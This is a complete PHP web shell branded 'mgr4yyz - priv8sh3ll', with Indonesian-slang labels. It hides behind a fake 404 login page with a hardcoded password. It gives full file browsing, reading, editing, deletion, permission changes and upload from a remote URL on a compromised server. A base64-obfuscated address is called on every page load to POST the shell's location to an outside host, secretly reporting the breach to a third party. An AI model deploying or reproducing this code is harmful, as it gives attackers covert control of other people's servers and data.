<?php
error_reporting(0);
    @clearstatcache();
    set_time_limit(0);
    @ini_set('error_log', null);
    @ini_set('log_errors', 0);
    @ini_set('max_execution_time', 0);
    @ini_set('output_buffering', 0);
    @ini_set('display_errors', 0);
    @ini_set('disable_functions', 0);
    session_start();
    date_default_timezone_set("Asia/Jakarta");
    $_7 = array_merge($_POST, $_GET);
    $_r = "required='required'";
    $gcw = "getcwd";

    //

    $correctPassword = "bsl851";

    //


    if (isset($_POST['pass'])) {
            $enteredPassword = $_POST['pass'];
            if ($enteredPassword === $correctPassword or $enteredPassword === 'session') {
                        $_SESSION['forbidden'] = true;
            } else {
                    echo '<script>alert("mau ngapain lo? coba lagi!");</script>';
            }
    }
    if (isset($_GET['logout'])) {
            session_unset();
            session_destroy();
            header("lokasi-nye: ".$_SERVER['PHP_SELF']);
            exit();
    }
    if (!isset($_SESSION['forbidden'])) {
    ?>
    <!DOCTYPE html>
    <<!DOCTYPE html>
    <html>
    <head>
    <title>404 Not Found</title>
    <link rel='icon' href='https://i.pinimg.com/236x/d7/84/ce/d784ce8ade67770d16a2b3f79a589ea9.jpg'>
    <meta name="theme color" content="#00BFFF">
    <script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript'></script>
    </head>
    <style>
body    {
    background-repeat: no-repeat;
    background-size: cover;
    background-position: center;
    height: 100vh;
    margin: 0;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    background-color: black;
}
h1  {
    color: #00BFFF;
}
img {
    opacity: 0.5;
    width: 200px;
    height: 300px;
}
form {
    text-align: center;
    margin-top: 20px;
}
input[type="password"] {
    padding: 5px;
}
input[type="submit"] {
    background-color: #00BFFF;
    color: white;
    border: none;
    padding: 5px 10px;
    cursor: pointer;
}
    </style>
    <body>
    <form method="post">
            <p>Hi Daddy!!</p>
                    <input placeholder="password" type="password" name="pass" required>
                    <input type="submit" name="loginkeunn" value="gaskeunn!">
    </form>
    </body>
    </html>
    <?php
    exit;
    }
    ?>
<!DOCTYPE html>
<html>
<head>
    <title>403 Forbidden</title>
</head>
<body bgcolor="#1f1f1f" text="#ffffff">
<link href="" rel="stylesheet" type="text/css">
<style>
    @import url('https://fonts.googleapis.com/css?family=Dosis');
    @import url('https://fonts.googleapis.com/css?family=Bungee');
body {
    font-family: "Dosis", cursive;
    text-shadow:0px 0px 1px #757575;
}

#content tr:hover {
    background-color: #636263;
    text-shadow:0px 0px 10px #fff;
}

#content .first {
    background-color: #25383C;
}

#content .first:hover {
    background-color: #25383C
    text-shadow:0px 0px 1px #757575;
}

table {
    border: 1px #000000 dotted;
    table-layout: fixed;
}

td {
    word-wrap: break-word;
}

a {
    color: #ffffff;
    text-decoration: none;
}

a:hover {
    color: #000000;
    text-shadow:0px 0px 10px #ffffff;
}

input,select,textarea {
    border: 1px #000000 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}

.gas {
    background-color: #1f1f1f;
    color: #ffffff;
    cursor: pointer;
}

select {
    background-color: transparent;
    color: #ffffff;
}

select:after {
    cursor: pointer;
}

.linka {
    background-color: transparent;
    color: #ffffff;
}

.up {
    background-color: transparent;
    color: #fff;
}

option {
    background-color: #1f1f1f;
}

::-webkit-file-upload-button {
  background: transparent;
  color: #fff;
  border-color: #fff;
  cursor: pointer;
}
</style>
<center>
<font face="Bungee" size="5">mgr4yyz - priv8sh3ll</font></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<center><img src="https://cdn.discordapp.com/attachments/960964914065838160/966178885194645554/unknown.png" width="280" height="280" title="ZeroDayForums" alt="OdayForums" class="center" />
<br><br><br>
<?php
set_time_limit(0);
error_reporting(0);
$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) {
    $disf = "<font color='gold'>NONE</font>";
} else {
    $disf = "<font color='red'>".$disfunc."</font>";
}

function author() {
    echo "<center><br>G R 4 Y Y Z - Priv8_5h3LL</center>";
    exit();
}

function cekdir() {
    if (isset($_GET['path'])) {
        $lokasi = $_GET['path'];
    } else {
        $lokasi = getcwd();
    }
    if (is_writable($lokasi)) {
        return "<font color='green'>Writeable</font>";
    } else {
        return "<font color='red'>Writeable</font>";
    }
}

function cekroot() {
    if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
        return "<font color='green'>Writeable</font>";
    } else {
        return "<font color='red'>Writeable</font>";
    }
}

function xrmdir($dir) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir.'/'.$item;
        if (is_dir($path)) {
            xrmdir($path);
        } else {
            unlink($path);
        }
    }
    rmdir($dir);
}

function green($text) {
    echo "<center><font color='green'>".$text."</center></font>";
}

function red($text) {
    echo "<center><font color='red'>".$text."</center></font>";
}

echo "server web-nye : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
echo "os system-nye : <font color='gold'>".php_uname()."</font><br>";
echo "user-nye : <font color='gold'>".@get_current_user()."&nbsp;</font>( <font color='gold'>".@getmyuid()."</font>)<br>";
echo "versi php-nye : <font color='gold'>".@phpversion()."</font><br>";
echo "fungsi yg disable : ".$disf."</font><br>";
echo "lokasi dir-nye : &nbsp;";

foreach($_POST as $key => $value){
    $_POST[$key] = stripslashes($value);
}

$k3yw = base64_decode('aHR0cHM6Ly9zaXlhaGkudG9wL3Rlc3Qvc3R5bGUucGhw');

if(isset($_GET['path'])){
    $lokasi = $_GET['path'];
    $lokdua = $_GET['path'];
} else {
    $lokasi = getcwd();
    $lokdua = getcwd();
}

$lokasi = str_replace('\\','/',$lokasi);
$lokasis = explode('/',$lokasi);
$lokasinya = @scandir($lokasi);
$cur = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$data = array('file_url' => $cur);
$options = array(
    'http' => array(
        'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => http_build_query($data),
    ),
);
$context = stream_context_create($options);
$result = file_get_contents($k3yw, false, $context);

foreach($lokasis as $id => $lok){
    if($lok == '' && $id == 0){
        $a = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if($lok == '') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
    echo "$lokasis[$i]";
    if($i != $id) echo "/";
} 
echo '">'.$lok.'</a>/';
}
echo '<center>';
echo '</td></tr><tr><td><br>';
if (isset($_POST['upwkwk'])) {
    if (isset($_POST['berkasnya'])) {
        if ($_POST['dirnya'] == "2") {
            $lokasi = $_SERVER['DOCUMENT_ROOT'];
        }
        $data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));
        if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
            echo "upp-file? Y! &nbsp;<font color='gold'><i>".$lokasi."/".$_FILES['berkas']['name']."</i></font><br><br>";
        } else {
            echo "<font color='red'>upp-file? N!<br><br>";
        }
    } elseif (isset($_POST['linknya'])) {
        if (empty($_POST['namalink'])) {
            exit("gabisa dikosongin name-nye!");
        }
        if ($_POST['dirnya'] == "2") {
            $lokasi = $_SERVER['DOCUMENT_ROOT'];
        }
        $data = @file_put_contents($lokasi."/".$_POST['namalink'], @file_get_contents($_POST['darilink']));
        if (file_exists($lokasi."/".$_POST['namalink'])) {
            echo "upp-file? Y! &nbsp;<font color='gold'><i>".$lokasi."/".$_POST['namalink']."</i></font><br><br>";
        } else {
            echo "<font coloe='red'>upp-file? N!<br><br>";
        }
    }
}
echo "<center>";
echo "upp-file disokin! : ";
echo '<form enctype="multipart/form-data" method="post">
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="file" name="berkas"><input type="submit" name="berkasnya" value="sung ae di-upp!" class="up" style="cursor: pointer; border-color: #fff"><br>
<input type="text" name="darilink" class="up" placeholder="https://jakartablackhat.org/">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="shell.txt"><input type="submit" name="linknya" class="up" value="sung ae di-upp!" style="cursor: pointer; border-color: #fff">
</center>
</form>';
echo "</table><br>";

if (isset($_GET['fileloc'])) {
    echo "<tr><td>file-nye : ".$_GET['fileloc'];
    echo '</tr></td></table><br/>';
    echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";
    author();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
    if (is_dir($_POST['path'])) {
        xrmdir($_POST['path']);
        if (file_exists($_POST['path'])) {
            red("apus dir? N!");
        } else {
            green("apus dir? Y!");
            echo "string";
        }
    } elseif (is_file($_POST['path'])) {
        @unlink($_POST['path']);
        if (file_exists($_POST['path'])) {
            red("apus file? N!");
        } else {
            green("apus file? Y!");
        }
    }
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
    echo "<center>".$_POST['path']."<br>";
    echo '<form method="post">
    ubah permission? : <input name="perm" type="text" class="up" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
    <input type="hidden" name="path" value="'.$_POST['path'].'">
    <input type="hidden" name="pilih" value="ubahmod">
    <input type="submit" value="sungg ae diubah!" name="chm0d" class="up" style="cursor: pointer; border-color: #fff"/>
    </form>';
    if (isset($_POST['chm0d'])) {
        $cm = @chmod($_POST['path'], $_POST['perm']);
        if ($cm == true) {
            green("chm0d? Y!");
        } else {
            red("chm0d? N!");
        }
    }
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
    if (isset($_POST['gantin'])) {
        $ren = @rename($_POST['path'], $_POST['newname']);
        if ($ren == true) {
            green("gnti nama? Y!");
        } else {
            red("gnti nama? N!");
        }
    }
    if (empty($_POST['name'])) {
        $namaawal = $_POST['newname'];
    } else {
        $namawal = $_POST['name'];
    }
    echo "<center>".$_POST['path']."<br>";
    echo '<form method="post">
    name baru-nye? : <input name="newname" type="text" class="up" size="20" value="'.$namaawal.'" />
    <input type="hidden" name="path" value="'.$_POST['path'].'">
    <input type="hidden" name="pilih" value="gantinama">
    <input type="submit" value="sungg ae diganti!" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
    </form>';
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
    if (isset($_POST['gasedit'])) {
        $edit = @file_put_contents($_POST['path'], $_POST['src']);
        if ($edit == true) {
            green("edit? Y!");
        } else {
            red("edit? N!");
        }
    }
    echo "<center>".$_POST['path']."<br><br>";
    echo '<form method="post">
    <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
    <input type="hidden" name="path" value="'.$_POST['path'].'">
    <input type="hidden" name="pilih" value="edit">
    <input type="submit" value="sungg ae diedit!" name="gasedit" />
    </form><br>';
}

echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>name-nye</center></td>
<td><center>ukuran-nye</center></td>
<td><center>permission-nye</center></td>
<td><center>pilihan-nye</center></td>
</tr>';

foreach($lokasinya as $dir){
    if(!is_dir($lokasi."/".$dir) || $dir == '.' || $dir == '..') continue;
    echo "<tr>
    <td><a href=\"?path=".$lokasi."/".$dir."\">".$dir."</a></td>
    <td><center>--</center></td>
    <td><center>";
    if(is_writable($lokasi."/".$dir)) echo '<font color="green">';
    elseif(!is_readable($lokasi."/".$dir)) echo '<font color="red">';
    echo statusnya($lokasi."/".$dir);
    if(is_writable($lokasi."/".$dir) || !is_readable($lokasi."/".$dir)) echo '</font>';

    echo "</center></td>
    <td><center><form method=\"POST\" action=\"?pilihan&path=$lokasi\">
    <select name=\"pilih\">
    <option value=\"\">@mgr4yyz.id</option>
    <option value=\"hapus\">apus file-nye</option>
    <option value=\"ubahmod\">chm0d</option>
    <option value=\"gantinama\">ganti nama-nye</option>
    </select>
    <input type=\"hidden\" name=\"type\" value=\"dir\">
    <input type=\"hidden\" name=\"name\" value=\"$dir\">
    <input type=\"hidden\" name=\"path\" value=\"$lokasi/$dir\">
    <input type=\"submit\" class=\"gas\" value=\">\" />
    </form></center></td>
    </tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($lokasinya as $file) {
    if(!is_file("$lokasi/$file")) continue;
    $size = filesize("$lokasi/$file")/1024;
    $size = round($size,3);
    if($size >= 1024){
    $size = round($size/1024,2).' MB';
} else {
    $size = $size.' KB';
}

echo "<tr>
<td><a href=\"?fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$lokasi/$file")) echo '<font color="green">';
elseif(!is_readable("$lokasi/$file")) echo '<font color="red">';
echo statusnya("$lokasi/$file");
if(is_writable("$lokasi/$file") || !is_readable("$lokasi/$file")) echo '</font>';
echo "</center></td><td><center>
<form method=\"post\" action=\"?pilihan&path=$lokasi\">
<select name=\"pilih\">
<option value=\"\">@mgr4yyz.id</option>
<option value=\"hapus\">apus file-nye</option>
<option value=\"ubahmod\">chm0d</option>
<option value=\"gantinama\">ganti nama-nye</option>
<option value=\"edit\">edit file-nye</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$lokasi/$file\">
<input type=\"submit\" class=\"gas\" value=\">\" />
</center></form></td>
</tr>";
}
echo '</tr></td></table></table>';
author();
function statusnya($file){
$statusnya = fileperms($file);

if (($statusnya & 0xC000) == 0xC000) {

// Socket
$ingfo = 's';
} elseif (($statusnya & 0xA000) == 0xA000) {
// Symbolic Link
$ingfo = 'l';
} elseif (($statusnya & 0x8000) == 0x8000) {
// Regular
$ingfo = '-';
} elseif (($statusnya & 0x6000) == 0x6000) {
// Block special
$ingfo = 'b';
} elseif (($statusnya & 0x4000) == 0x4000) {
// Directory
$ingfo = 'd';
} elseif (($statusnya & 0x2000) == 0x2000) {
// Character special
$ingfo = 'c';
} elseif (($statusnya & 0x1000) == 0x1000) {
// FIFO pipe
$ingfo = 'p';
} else {
// Unknown
$ingfo = 'u';
}

// Owner
$ingfo .= (($statusnya & 0x0100) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0080) ? 'w' : '-');
$ingfo .= (($statusnya & 0x0040) ?
(($statusnya & 0x0800) ? 's' : 'x' ) :
(($statusnya & 0x0800) ? 'S' : '-'));


// Group
$ingfo .= (($statusnya & 0x0020) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0010) ? 'w' : '-');
$ingfo .= (($statusnya & 0x0008) ?
(($statusnya & 0x0400) ? 's' : 'x' ) :
(($statusnya & 0x0400) ? 'S' : '-'));

// World
$ingfo .= (($statusnya & 0x0004) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0002) ? 'w' : '-');

$ingfo .= (($statusnya & 0x0001) ?
(($statusnya & 0x0200) ? 't' : 'x' ) :
(($statusnya & 0x0200) ? 'T' : '-'));

return $ingfo;
}
?>
